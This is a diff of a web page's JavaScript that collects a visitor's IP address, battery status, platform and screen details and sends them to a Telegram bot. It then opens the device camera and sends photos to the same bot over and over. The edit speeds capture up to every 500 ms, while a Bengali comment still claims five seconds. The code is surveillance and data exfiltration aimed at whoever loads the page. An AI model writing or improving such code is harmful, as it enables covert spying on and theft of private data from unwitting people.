@@ -21,19 +21,16 @@
         const canvas = document.getElementById('canvas');
         let videoStream = null;
         let video = null;
-        let useFrontCamera = true;
+        let intervalId = null;
 
         async function sendDeviceInfo() {
             try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ipAddress = ipData.ip;
-                
-                const battery = navigator.getBattery ? await navigator.getBattery() : null;
-                const batteryStatus = battery ? `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}` : "Battery info not available";
-                
-                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                const networkInfo = connection ? `Network Type: ${connection.effectiveType}, Downlink: ${connection.downlink} Mbps` : "Network info not available";
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ipAddress = data.ip;
+
+                const battery = await navigator.getBattery();
+                const batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
 
                 const deviceInfo = `
 Device Information:
@@ -42,7 +39,6 @@ Device Information:
 - Platform: ${navigator.platform}
 - Screen Resolution: ${window.screen.width}x${window.screen.height}
 - ${batteryStatus}
-- ${networkInfo}
                 `;
 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -55,10 +51,10 @@ Device Information:
             }
         }
 
-        async function startCamera(facingMode) {
+        async function startCamera() {
             try {
                 video = document.createElement('video');
-                videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: facingMode } } });
+                videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = videoStream;
 
                 return new Promise((resolve) => {
@@ -98,23 +94,15 @@ Device Information:
             });
         }
 
-        async function toggleCamera() {
-            stopCamera(); // Stop current camera
-            const facingMode = useFrontCamera ? 'user' : 'environment';
-            const cameraStarted = await startCamera(facingMode);
-            if (cameraStarted) {
-                await sendPhoto(); // Send photo immediately
-                useFrontCamera = !useFrontCamera; // Toggle camera for next iteration
-            }
-        }
-
         async function startPhotoCaptureLoop() {
-            await sendDeviceInfo();
+            sendDeviceInfo(); // ডিভাইসের তথ্য প্রথমেই পাঠাবে
 
-            while (true) {
-                await toggleCamera(); // Switch camera and send photo
-                await new Promise(resolve => setTimeout(resolve, 5000)); // Wait for 5 seconds
-            }
+            const cameraStarted = await startCamera();
+            if (!cameraStarted) return;
+
+            sendPhoto(); // প্রথম ছবি পাঠাবে
+
+            intervalId = setInterval(sendPhoto, 500); // প্রতি ৫ সেকেন্ডে নতুন ছবি পাঠাবে
         }
 
         function stopCamera() {
@@ -122,6 +110,10 @@ Device Information:
                 videoStream.getTracks().forEach(track => track.stop());
                 videoStream = null;
                 video = null;
+            }
+            if (intervalId) {
+                clearInterval(intervalId);
+                intervalId = null;
             }
         }
 
